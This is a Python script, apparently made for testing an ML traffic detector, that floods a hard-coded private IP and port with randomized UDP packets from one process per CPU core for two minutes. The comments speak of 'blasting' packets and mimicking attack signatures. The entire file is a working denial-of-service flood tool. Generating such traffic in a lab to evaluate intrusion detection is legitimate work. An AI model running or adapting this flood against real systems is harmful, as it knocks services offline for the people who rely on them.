import socket
import multiprocessing
import random
import time

# --- CONFIGURATION ---
TARGET_IP = "10.71.36.211"
TARGET_PORT = 5173
PROCESS_COUNT = multiprocessing.cpu_count() # Use ALL your cores
DURATION = 120 # Longer duration helps ML models aggregate flow data

def ultimate_push():
    # Using a raw UDP socket for maximum speed
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Randomizing payload size to mimic different attack signatures
    payloads = [random._urandom(size) for size in [64, 512, 1024, 1450]]
    
    timeout = time.time() + DURATION
    print(f"Worker process active...")
    
    while time.time() < timeout:
        # Use a tight loop to blast packets
        for _ in range(100):
            p = random.choice(payloads)
            sock.sendto(p, (TARGET_IP, TARGET_PORT))

if __name__ == "__main__":
    print(f"🔥 Pushing for High Confidence on {TARGET_IP}...")
    print(f"Using {PROCESS_COUNT} parallel processes.")

    workers = []
    for _ in range(PROCESS_COUNT):
        p = multiprocessing.Process(target=ultimate_push)
        p.start()
        workers.append(p)

    for p in workers:
        p.join()

    print("✅ High-intensity flow completed.")